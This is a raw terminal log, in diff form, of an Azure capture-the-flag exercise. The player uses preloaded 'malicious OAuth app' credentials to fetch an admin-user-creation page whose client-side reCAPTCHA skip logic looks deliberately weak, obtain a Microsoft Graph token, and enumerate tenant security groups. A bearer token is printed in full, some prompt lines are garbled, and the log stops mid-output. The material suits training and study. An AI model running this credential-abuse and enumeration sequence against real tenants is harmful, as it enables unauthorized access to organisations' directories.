@@ -1,0 +1,860 @@
+
+==========================================
+Azure credentials have been preloaded as environment variables:
+  - $AZURE_CLIENT_ID
+  - $AZURE_CLIENT_S3CR3T
+  - $AZURE_TENANT_ID
+  - $WEB_APP_ENDPOINT
+
+You can use these directly with Azure CLI or in your scripts.
+==========================================
+
+Azure CLI is installed. Your malicious OAuth app credentials and the target web app endpoint are preloaded as environment variables for your convenience.
+user@monthly-challenge:~$ env | grep AZURE
+AZURE_TENANT_ID=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+AZURE_CLIENT_S3CR3T=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+AZURE_CLIENT_ID=f83cb3d7-47de-4154-be65-c85d697cdfd3
+user@monthly-challenge:~$ echo $WEB_APP_ENDPOINT
+https://app-admin-dpbug0fqb4gea3a6.z01.azurefd.net/
+user@monthly-challenge:~$ curl -s $WEB_APP_ENDPOINT
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin User Generator</title>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    /* Global Styles */
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background-color: #1a1a1e;
+      background-image: 
+        linear-gradient(#2d5cff 1px, transparent 1px),
+        linear-gradient(90deg, #2d5cff 1px, transparent 1px);
+      background-size: 60px 60px;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #ffffff;
+      overflow-x: hidden;
+    }
+
+    .container {
+      background: rgba(26, 26, 35, 0.85);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(45, 92, 255, 0.3);
+      padding: 48px 40px;
+      border-radius: 20px;
+      box-shadow: 
+        0 8px 32px rgba(0, 0, 0, 0.6),
+        0 0 0 1px rgba(45, 92, 255, 0.2);
+      width: 100%;
+      max-width: 480px;
+      position: relative;
+      transition: all 0.3s ease;
+    }
+
+
+    h1 {
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: #ffffff;
+      text-align: center;
+      margin: 0 0 40px 0;
+      line-height: 1.2;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: 600;
+      color: #e0e6ed;
+      font-size: 0.9rem;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 18px 20px;
+      margin: 0 0 28px 0;
+      border-radius: 12px;
+      border: 1px solid rgba(45, 92, 255, 0.4);
+      font-size: 1rem;
+      background: rgba(20, 20, 28, 0.9);
+      color: #ffffff;
+      font-family: 'Inter', sans-serif;
+      transition: all 0.3s ease;
+      outline: none;
+      box-sizing: border-box;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #2d5cff;
+      box-shadow: 
+        0 0 0 3px rgba(45, 92, 255, 0.2),
+        0 0 15px rgba(45, 92, 255, 0.4);
+      transform: translateY(-2px);
+    }
+
+    input[type="text"]::placeholder,
+    input[type="password"]::placeholder {
+      color: rgba(224, 230, 237, 0.5);
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 20px 32px;
+      margin: 32px 0 0 0;
+      border-radius: 50px;
+      border: none;
+      font-size: 1.1rem;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      background: #ff6ec7;
+      color: #000000;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: none;
+      letter-spacing: 0px;
+      position: relative;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"]:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(255, 110, 199, 0.3);
+      filter: brightness(1.05);
+    }
+
+    input[type="submit"]:active {
+      transform: translateY(0px);
+    }
+
+    .g-recaptcha {
+      margin: 28px 0;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      display: flex;
+      justify-content: center;
+    }
+
+    .error-message,
+    .password-complexity-error,
+    .recaptcha-error,
+    .rate-limit-error {
+      background: rgba(255, 71, 87, 0.1);
+      border: 1px solid rgba(255, 71, 87, 0.3);
+      border-radius: 10px;
+      color: #ff4757;
+      font-size: 0.9rem;
+      padding: 14px 18px;
+      margin-top: 18px;
+      display: none;
+      backdrop-filter: blur(5px);
+      text-shadow: 0 0 10px rgba(255, 71, 87, 0.3);
+      animation: errorPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes errorPulse {
+      0%, 100% { box-shadow: 0 0 5px rgba(255, 71, 87, 0.3); }
+      50% { box-shadow: 0 0 15px rgba(255, 71, 87, 0.5); }
+    }
+
+    .success-message {
+      background: rgba(0, 255, 127, 0.1);
+      border: 1px solid rgba(0, 255, 127, 0.3);
+      border-radius: 12px;
+      color: #00ff7f;
+      font-size: 1rem;
+      padding: 18px 20px;
+      margin-top: 32px;
+      text-align: center;
+      backdrop-filter: blur(5px);
+      text-shadow: 0 0 10px rgba(0, 255, 127, 0.3);
+      animation: successPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes successPulse {
+      0%, 100% { box-shadow: 0 0 5px rgba(0, 255, 127, 0.3); }
+      50% { box-shadow: 0 0 15px rgba(0, 255, 127, 0.5); }
+    }
+
+    /* Responsive design */
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+        padding: 36px 28px;
+        max-width: calc(100vw - 40px);
+      }
+      
+      h1 {
+        font-size: 1.9rem;
+        margin-bottom: 32px;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        padding: 16px 18px;
+        margin-bottom: 24px;
+      }
+
+      input[type="submit"] {
+        padding: 18px 28px;
+        margin-top: 28px;
+      }
+
+      .g-recaptcha {
+        margin: 24px 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Create Admin User</h1>
+
+    <form id="userForm">
+      <label for="firstName">First Name:</label>
+      <input type="text" id="firstName" name="firstName" required>
+
+      <label for="lastName">Last Name:</label>
+      <input type="text" id="lastName" name="lastName" required>
+
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" required>
+
+      <div class="g-recaptcha" data-sitekey="6LfXWpkrAAAAALCOhAlN7ggTcZ9ehVK0ij3Q9v2C"></div>
+      <div class="error-message" id="captchaError">Please verify that you're not a robot.</div>
+      <div class="recaptcha-error" id="recaptchaError">Please refresh the page and revalidate the captcha.</div>
+      <div class="password-complexity-error" id="passwordComplexityError">Password does not comply with complexity requirements. Please provide a different password.</div>
+      <div class="rate-limit-error" id="rateLimitError">Too many user creation attempts, please try again later.</div>
+
+      <input type="submit" value="Create User">
+    </form>
+
+    <div class="success-message" id="successMessage" style="display: none;">
+      User created successfully! <br> Username: <span id="userPrincipalName"></span>
+    </div>
+  </div>
+
+  <script>
+    // Store reCAPTCHA token and validation status
+    let recaptchaToken = null;
+    let recaptchaValidUntil = null;
+    const RECAPTCHA_VALIDITY_MS = 2 * 60 * 1000; // 2 minutes
+
+    document.getElementById('userForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      const captchaError = document.getElementById('captchaError');
+      const recaptchaError = document.getElementById('recaptchaError');
+      const passwordComplexityError = document.getElementById('passwordComplexityError');
+      const rateLimitError = document.getElementById('rateLimitError');
+      const successMessage = document.getElementById('successMessage');
+
+      // Clear previous messages
+      captchaError.style.display = 'none';
+      recaptchaError.style.display = 'none';
+      passwordComplexityError.style.display = 'none';
+      rateLimitError.style.display = 'none';
+      successMessage.style.display = 'none';
+
+      // Check if reCAPTCHA token is empty and no valid token is stored
+      const currentRecaptchaToken = grecaptcha.getResponse();
+      if (!currentRecaptchaToken && (!recaptchaToken || Date.now() > recaptchaValidUntil)) {
+        captchaError.style.display = 'block';
+        return;
+      }
+
+      // Use stored token if available and still valid, otherwise use new token
+      const tokenToUse = (recaptchaToken && Date.now() <= recaptchaValidUntil) ? recaptchaToken : currentRecaptchaToken;
+
+      // Collect form data
+      const formData = new FormData(this);
+      formData.append('token', tokenToUse);
+      if (recaptchaToken && Date.now() <= recaptchaValidUntil) {
+        formData.append('skipRecaptcha', 'true');
+      }
+
+      // Send the form data to the backend
+      fetch('/create-user', {
+        method: 'POST',
+        body: new URLSearchParams(formData)
+      })
+      .then(response => {
+        // Check if the response status is not OK
+        if (!response.ok) {
+          return response.json().then(errorData => {
+            throw errorData; // Pass the JSON error data to the catch block
+          });
+        }
+        return response.json();
+      })
+      .then(data => {
+        // Handle success response
+        if (data.message) {
+          // Clear stored reCAPTCHA token on success
+          recaptchaToken = null;
+          recaptchaValidUntil = null;
+          grecaptcha.reset(); // Reset reCAPTCHA widget
+          successMessage.style.display = 'block';
+          document.getElementById('userPrincipalName').textContent = data.userPrincipalName;
+        } else {
+          throw new Error('Unexpected response format');
+        }
+      })
+      .catch(errorData => {
+        console.error('Error:', errorData);
+
+        // Handle specific error cases based on the backend's error message
+        if (errorData.error) {
+          if (errorData.error.includes('Please refresh the page and revalidate the captcha')) {
+            // Clear stored token on reCAPTCHA failure
+            recaptchaToken = null;
+            recaptchaValidUntil = null;
+            grecaptcha.reset(); // Reset reCAPTCHA widget
+            recaptchaError.style.display = 'block';
+          } else if (errorData.error.includes('Password does not comply with complexity requirements')) {
+            // Store reCAPTCHA token if validated
+            if (errorData.recaptchaValid && tokenToUse && !recaptchaToken) {
+              recaptchaToken = tokenToUse;
+              recaptchaValidUntil = Date.now() + RECAPTCHA_VALIDITY_MS;
+            }
+            passwordComplexityError.style.display = 'block';
+          } else if (errorData.error.includes('Too many user creation attempts')) {
+            rateLimitError.style.display = 'block';
+          } else {
+            // Display generic error message for other cases
+            alert(`Error: ${errorData.error || 'Something went wrong. Please try again.'}`);
+          }
+        } else {
+          // Fallback for unexpected errors
+          alert('Something went wrong. Please try again.');
+        }
+      });
+    });
+  </script>
+</body>
+</html>user@monthly-challecurl -s -X POST "https://login.microsoftonline.com/azurectfchallengegame.com/oauth2/v2.0/token" \oken" \
+  -d "client_id=$AZURE_CLIENT_ID" \
+  -d "client_secret=$AZURE_CLIENT_S3CR3T" \
+  -d "grant_type=client_credentials" \
+  -d "scope=https://graph.microsoft.com/.default"
+{"token_type":"Bearer","expires_in":3598,"ext_expires_in":3598,"access_token":"eyJ0eXAiOiJKV1QiLCJub25jZSI6Ijc2QVRFOHBzZjQzWXMyT2k0bFV1MmxGS0VEWGoxRzF4TDlGbERTM2t6RU0iLCJhbGciOiJSUzI1NiIsIng1dCI6IlUxc1g4WUZIUzdaNlZsN1ZITEl6VGVqYnZqMCIsImtpZCI6IlUxc1g4WUZIUzdaNlZsN1ZITEl6VGVqYnZqMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9kMjZmMzUzZC1jNTY0LTQ4ZTctYjI2Zi1hYTQ4YzZlZWNkNTgvIiwiaWF0IjoxNzc2MDgwOTY3LCJuYmYiOjE3NzYwODA5NjcsImV4cCI6MTc3NjA4NDg2NywiYWlvIjoiQVNRQTIvOGJBQUFBYUNneHFNVDJ4YlUzTG44ZDdoaVV5c2p6ZWMvQi9QTjFvMUVTMnNiWFVydz0iLCJhcHBfZGlzcGxheW5hbWUiOiJtYWxpY2lvdXMtb2F1dGgtYXBwIiwiYXBwaWQiOiJmODNjYjNkNy00N2RlLTQxNTQtYmU2NS1jODVkNjk3Y2RmZDMiLCJhcHBpZGFjciI6IjEiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9kMjZmMzUzZC1jNTY0LTQ4ZTctYjI2Zi1hYTQ4YzZlZWNkNTgvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI5OTY2NzdmOC02OWYxLTQxNzEtYmUwMC0yMDdmM2UwNWZhZWMiLCJyaCI6IjEuQWE0QVBUVnYwbVRGNTBpeWI2cEl4dTdOV0FNQUFBQUFBQUFBd0FBQUFBQUFBQUFBQUFDdUFBLiIsInJvbGVzIjpbIkdyb3VwLlJlYWQuQWxsIiwiVXNlci5JbnZpdGUuQWxsIl0sInN1YiI6Ijk5NjY3N2Y4LTY5ZjEtNDE3MS1iZTAwLTIwN2YzZTA1ZmFlYyIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6ImQyNmYzNTNkLWM1NjQtNDhlNy1iMjZmLWFhNDhjNmVlY2Q1OCIsInV0aSI6InBrWllUZFJkSTA2ZmhMTGsxaE5iQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjA5OTdhMWQwLTBkMWQtNGFjYi1iNDA4LWQ1Y2E3MzEyMWU5MCJdLCJ4bXNfYWNkIjoxNzUzOTcxOTM3LCJ4bXNfYWN0X2ZjdCI6IjkgMyIsInhtc19mdGQiOiI0QkRPYVdBUEphVDlLOWhxdjliMnM3WURiaEdPZE5sQXVzcndLbHJrQ3JFQlpYVnliM0JsYm05eWRHZ3RaSE50Y3ciLCJ4bXNfaWRyZWwiOiI3IDIiLCJ4bXNfcGZ0ZXhwIjoxNzc2MTcxMjY3LCJ4bXNfcmQiOiIwLjQtTGdZQkppV2NmNG5rbEloSU5WU09DSWQ5VTByUXBkejZWWDE3OVlIc29kTHlUQ3dTNGtFRmN1MjVsWWN0QjctVzZXb0VsYmxiS0VSRGc0aFFSV3Z2OTZJZGZhejNOLUtIZTc1SzI5T2tJaUhCeENBc3dNRUhBQVNndUpjSEFMQ1JSbTJQMzVwdnE5WHRpU0s1WDVnUDQ3QUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoxNzU1NTk2NTk0LCJ4bXNfdG50X2ZjdCI6IjMgMTQifQ.bzKcOA9YDT46p1aFKCs5sfp7pDsmvP_sPbGAXP1YgaQvJ2sohMXtUBsFtNID7GmpLiNO9dv_OklR0JtN0NHqkkPD4sm-p68cxg0_bITOE6mqvfqgBduhfsV5uf4nJgoD_UxyefCAREugWVGUI0_6XJebbf1NTMSh1fMMlmeitQtZNpUE8WnVE3_idae2aj2RRd7Um0DKHkaq28XuFhFPlqbBks6mMegOHROmv7xH1lf3RZZeCR06krdATKQlYOE809MdxLQC3LDxeA6RY48gjIVDS_O9Eiev1Kt-kEAc-lJdGqAFWTkC8qpKB7i5uqVbkPNQbKGGTJMMlldi7x3qQw"}user@monthly-challenge:~$ 
+user@monthly-challenge:~$ 
+user@monthly-challenge:~$ export TOKEN="yJ0eXAiOiJKV1QiLCJub25jZSI6Ijc2QVRFOHBzZjQzWXMyT2k0bFV1MmxGS0VEWGoxRzF4TDlGbERTM2t6RU0iLCJhbGciOiJSUzI1NiIsIng1dCI6IlUxc1g4WUZIUzdaNlZsN1ZITEl6VGVqYnZqMCIsImtpZCI6IlUxc1g4WUZIUzdaNlZsN1ZITEl6VGVqYnZqMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9kMjZmMzUzZC1jNTY0LTQ4ZTctYjI2Zi1hYTQ4YzZlZWNkNTgvIiwiaWF0IjoxNzc2MDgwOTY3LCJuYmYiOjE3NzYwODA5NjcsImV4cCI6MTc3NjA4NDg2NywiYWlvIjoiQVNRQTIvOGJBQUFBYUNneHFNVDJ4YlUzTG44ZDdoaVV5c2p6ZWMvQi9QTjFvMUVTMnNiWFVydz0iLCJhcHBfZGlzcGxheW5hbWUiOiJtYWxpY2lvdXMtb2F1dGgtYXBwIiwiYXBwaWQiOiJmODNjYjNkNy00N2RlLTQxNTQtYmU2NS1jODVkNjk3Y2RmZDMiLCJhcHBpZGFjciI6IjEiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9kMjZmMzUzZC1jNTY0LTQ4ZTctYjI2Zi1hYTQ4YzZlZWNkNTgvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI5OTY2NzdmOC02OWYxLTQxNzEtYmUwMC0yMDdmM2UwNWZhZWMiLCJyaCI6IjEuQWE0QVBUVnYwbVRGNTBpeWI2cEl4dTdOV0FNQUFBQUFBQUFBd0FBQUFBQUFBQUFBQUFDdUFBLiIsInJvbGVzIjpbIkdyb3VwLlJlYWQuQWxsIiwiVXNlci5JbnZpdGUuQWxsIl0sInN1YiI6Ijk5NjY3N2Y4LTY5ZjEtNDE3MS1iZTAwLTIwN2YzZTA1ZmFlYyIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6ImQyNmYzNTNkLWM1NjQtNDhlNy1iMjZmLWFhNDhjNmVlY2Q1OCIsInV0aSI6InBrWllUZFJkSTA2ZmhMTGsxaE5iQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjA5OTdhMWQwLTBkMWQtNGFjYi1iNDA4LWQ1Y2E3MzEyMWU5MCJdLCJ4bXNfYWNkIjoxNzUzOTcxOTM3LCJ4bXNfYWN0X2ZjdCI6IjkgMyIsInhtc19mdGQiOiI0QkRPYVdBUEphVDlLOWhxdjliMnM3WURiaEdPZE5sQXVzcndLbHJrQ3JFQlpYVnliM0JsYm05eWRHZ3RaSE50Y3ciLCJ4bXNfaWRyZWwiOiI3IDIiLCJ4bXNfcGZ0ZXhwIjoxNzc2MTcxMjY3LCJ4bXNfcmQiOiIwLjQtTGdZQkppV2NmNG5rbEloSU5WU09DSWQ5VTByUXBkejZWWDE3OVlIc29kTHlUQ3dTNGtFRmN1MjVsWWN0QjctVzZXb0VsYmxiS0VSRGc0aFFSV3Z2OTZJZGZhejNOLUtIZTc1SzI5T2tJaUhCeENBc3dNRUhBQVNndUpjSEFMQ1JSbTJQMzVwdnE5WHRpU0s1WDVnUDQ3QUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoxNzU1NTk2NTk0LCJ4bXNfdG50X2ZjdCI6IjMgMTQifQ.bzKcOA9YDT46p1aFKCs5sfp7pDsmvP_sPbGAXP1YgaQvJ2sohMXtUBsFtNID7GmpLiNO9dv_OklR0JtN0NHqkkPD4sm-p68cxg0_bITOE6mqvfqgBduhfsV5uf4nJgoD_UxyefCAREugWVGUI0_6XJebbf1NTMSh1fMMlmeitQtZNpUE8WnVE3_idae2aj2RRd7Um0DKHkaq28XuFhFPlqbBks6mMegOHROmv7xH1lf3RZZeCR06krdATKQlYOE809MdxLQC3LDxeA6RY48gjIVDS_O9Eiev1Kt-kEAc-lJdGqAFWTkC8qpKB7i5uqVbkPNQbKGGTJMMlldi7x3qQw"
+user@monthly-challenge:~$ curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://graph.microsoft.com/v1.0/groups" | grep -i 'wiz{'
+user@monthly-challenge:~$ curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://graph.microsoft.com/v1.0/users" | grep -i 'wiz{'
+user@monthly-challenge:~$ curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups?$select=id,displayName,description" | jq .
+{
+  "error": {
+    "code": "InvalidAuthenticationToken",
+    "message": "IDX14102: Unable to decode the header '[PII of type 'Microsoft.IdentityModel.Logging.SecurityArtifact' is hidden. For more details, see https://aka.ms/IdentityModel/PII.]' as Base64Url encoded string.",
+    "innerError": {
+      "date": "2026-04-13T11:58:17",
+      "request-id": "24a14e77-6bc6-4454-abc0-6180a56ffe21",
+      "client-request-id": "24a14e77-6bc6-4454-abc0-6180a56ffe21"
+    }
+  }
+}
+user@monthly-challenge:~$ export TOKEN="eyJ0eXAiOiJKV1QiLCJub25jZSI6Ijc2QVRFOHBzZjQzWXMyT2k0bFV1MmxGS0VEWGoxRzF4TDlGbERTM2t6RU0iLCJhbGciOiJSUzI1NiIsIng1dCI6IlUxc1g4WUZIUzdaNlZsN1ZITEl6VGVqYnZqMCIsImtpZCI6IlUxc1g4WUZIUzdaNlZsN1ZITEl6VGVqYnZqMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9kMjZmMzUzZC1jNTY0LTQ4ZTctYjI2Zi1hYTQ4YzZlZWNkNTgvIiwiaWF0IjoxNzc2MDgwOTY3LCJuYmYiOjE3NzYwODA5NjcsImV4cCI6MTc3NjA4NDg2NywiYWlvIjoiQVNRQTIvOGJBQUFBYUNneHFNVDJ4YlUzTG44ZDdoaVV5c2p6ZWMvQi9QTjFvMUVTMnNiWFVydz0iLCJhcHBfZGlzcGxheW5hbWUiOiJtYWxpY2lvdXMtb2F1dGgtYXBwIiwiYXBwaWQiOiJmODNjYjNkNy00N2RlLTQxNTQtYmU2NS1jODVkNjk3Y2RmZDMiLCJhcHBpZGFjciI6IjEiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9kMjZmMzUzZC1jNTY0LTQ4ZTctYjI2Zi1hYTQ4YzZlZWNkNTgvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI5OTY2NzdmOC02OWYxLTQxNzEtYmUwMC0yMDdmM2UwNWZhZWMiLCJyaCI6IjEuQWE0QVBUVnYwbVRGNTBpeWI2cEl4dTdOV0FNQUFBQUFBQUFBd0FBQUFBQUFBQUFBQUFDdUFBLiIsInJvbGVzIjpbIkdyb3VwLlJlYWQuQWxsIiwiVXNlci5JbnZpdGUuQWxsIl0sInN1YiI6Ijk5NjY3N2Y4LTY5ZjEtNDE3MS1iZTAwLTIwN2YzZTA1ZmFlYyIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6ImQyNmYzNTNkLWM1NjQtNDhlNy1iMjZmLWFhNDhjNmVlY2Q1OCIsInV0aSI6InBrWllUZFJkSTA2ZmhMTGsxaE5iQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjA5OTdhMWQwLTBkMWQtNGFjYi1iNDA4LWQ1Y2E3MzEyMWU5MCJdLCJ4bXNfYWNkIjoxNzUzOTcxOTM3LCJ4bXNfYWN0X2ZjdCI6IjkgMyIsInhtc19mdGQiOiI0QkRPYVdBUEphVDlLOWhxdjliMnM3WURiaEdPZE5sQXVzcndLbHJrQ3JFQlpYVnliM0JsYm05eWRHZ3RaSE50Y3ciLCJ4bXNfaWRyZWwiOiI3IDIiLCJ4bXNfcGZ0ZXhwIjoxNzc2MTcxMjY3LCJ4bXNfcmQiOiIwLjQtTGdZQkppV2NmNG5rbEloSU5WU09DSWQ5VTByUXBkejZWWDE3OVlIc29kTHlUQ3dTNGtFRmN1MjVsWWN0QjctVzZXb0VsYmxiS0VSRGc0aFFSV3Z2OTZJZGZhejNOLUtIZTc1SzI5T2tJaUhCeENBc3dNRUhBQVNndUpjSEFMQ1JSbTJQMzVwdnE5WHRpU0s1WDVnUDQ3QUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoxNzU1NTk2NTk0LCJ4bXNfdG50X2ZjdCI6IjMgMTQifQ.bzKcOA9YDT46p1aFKCs5sfp7pDsmvP_sPbGAXP1YgaQvJ2sohMXtUBsFtNID7GmpLiNO9dv_OklR0JtN0NHqkkPD4sm-p68cxg0_bITOE6mqvfqgBduhfsV5uf4nJgoD_UxyefCAREugWVGUI0_6XJebbf1NTMSh1fMMlmeitQtZNpUE8WnVE3_idae2aj2RRd7Um0DKHkaq28XuFhFPlqbBks6mMegOHROmv7xH1lf3RZZeCR06krdATKQlYOE809MdxLQC3LDxeA6RY48gjIVDS_O9Eiev1Kt-kEAc-lJdGqAFWTkC8qpKB7i5uqVbkPNQbKGGTJMMlldi7x3qQw"
+user@monthly-challenge:~$ curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups?$select=id,displayName,description" | jq .
+{
+  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#groups",
+  "value": [
+    {
+      "id": "0231085a-ee51-42f6-b641-42a1234cfb73",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T12:23:11Z",
+      "creationOptions": [],
+      "description": "Security group for network administrators managing VNets and firewalls",
+      "displayName": "SecGrp-Network-Admins",
+      "expirationDateTime": null,
+      "groupTypes": [],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "secgrp-network-admins",
+      "membershipRule": null,
+      "membershipRuleProcessingState": null,
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T12:23:11Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-36767834-1123479121-2705473974-1945848867",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    },
+    {
+      "id": "0ae4b3cc-4e7a-4fc1-b547-d2facad90119",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T12:24:08Z",
+      "creationOptions": [],
+      "description": "Security group for finance department with access to billing data",
+      "displayName": "SecGrp-Finance-Dept",
+      "expirationDateTime": null,
+      "groupTypes": [],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "secgrp-finance-dept",
+      "membershipRule": null,
+      "membershipRuleProcessingState": null,
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T12:24:08Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-182760396-1338068602-4208084917-419551690",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    },
+    {
+      "id": "192d7c4a-235e-45b4-866d-c3360db7eb1d",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T12:25:05Z",
+      "creationOptions": [],
+      "description": "Security group for HR department with access to employee data",
+      "displayName": "SecGrp-HR-Dept",
+      "expirationDateTime": null,
+      "groupTypes": [],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "secgrp-hr-dept",
+      "membershipRule": null,
+      "membershipRuleProcessingState": null,
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T12:25:05Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-422411338-1169433438-918777222-501987085",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    },
+    {
+      "id": "2661ef49-c568-4132-a59e-7b75e2ac05d6",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T12:22:19Z",
+      "creationOptions": [],
+      "description": "Security group for privileged administrators with global access",
+      "displayName": "SecGrp-Privileged-Admins",
+      "expirationDateTime": null,
+      "groupTypes": [],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "secgrp-privileged-admins",
+      "membershipRule": null,
+      "membershipRuleProcessingState": null,
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
+      "preferredDataLocation": null,
+      "preferredLanguage": null,
+      "proxyAddresses": [],
+      "renewedDateTime": "2025-08-19T12:22:19Z",
+      "resourceBehaviorOptions": [],
+      "resourceProvisioningOptions": [],
+      "securityEnabled": true,
+      "securityIdentifier": "S-1-12-1-643952457-1093846376-1971035813-3590696162",
+      "theme": null,
+      "uniqueName": null,
+      "visibility": null,
+      "onPremisesProvisioningErrors": [],
+      "serviceProvisioningErrors": []
+    },
+    {
+      "id": "313cf35f-8c44-478a-ba4a-11b7904e1c1c",
+      "deletedDateTime": null,
+      "classification": null,
+      "createdDateTime": "2025-08-19T12:23:34Z",
+      "creationOptions": [],
+      "description": "Security group for application developers with access to DevOps tools",
+      "displayName": "SecGrp-Developers",
+      "expirationDateTime": null,
+      "groupTypes": [],
+      "infoCatalogs": [],
+      "isAssignableToRole": null,
+      "mail": null,
+      "mailEnabled": false,
+      "mailNickname": "secgrp-developers",
+      "membershipRule": null,
+      "membershipRuleProcessingState": null,
+      "onPremisesDomainName": null,
+      "onPremisesLastSyncDateTime": null,
+      "onPremisesNetBiosName": null,
+      "onPremisesSamAccountName": null,
+      "onPremisesSecurityIdentifier": null,
+      "onPremisesSyncEnabled": null,
